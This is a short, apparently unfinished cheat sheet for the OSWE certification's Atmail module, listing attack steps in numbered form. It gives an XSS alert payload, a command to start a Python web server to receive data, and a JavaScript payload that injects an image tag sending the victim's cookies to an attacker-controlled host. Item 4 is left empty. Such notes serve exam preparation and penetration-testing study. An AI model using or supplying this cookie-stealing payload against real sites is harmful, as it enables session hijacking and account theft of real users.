# OSWE-cheat-sheet
OSWE-cheat sheet module by module with updated syllabus:

Module Atmail :

1. Access and alert cookie payload (Httponly flag should be disable in set-Cookie headers)<br>
    #<script>alert(document.cookie);</script>
    
2. Run Python Server in python3<br>
    #python3 -m http.server
    
3. Embeded cookie steal payload in image tag<br>
    #function addImage() {<br>
    #var img = document.createElement('img');<br>
    #img.src = 'http://AttackerIP:port/' + document.cookie;<br>
    #document.body.appendChild(img);<br>
    #}<br>
    #addImage();<br>
    
4. 
    
    
    
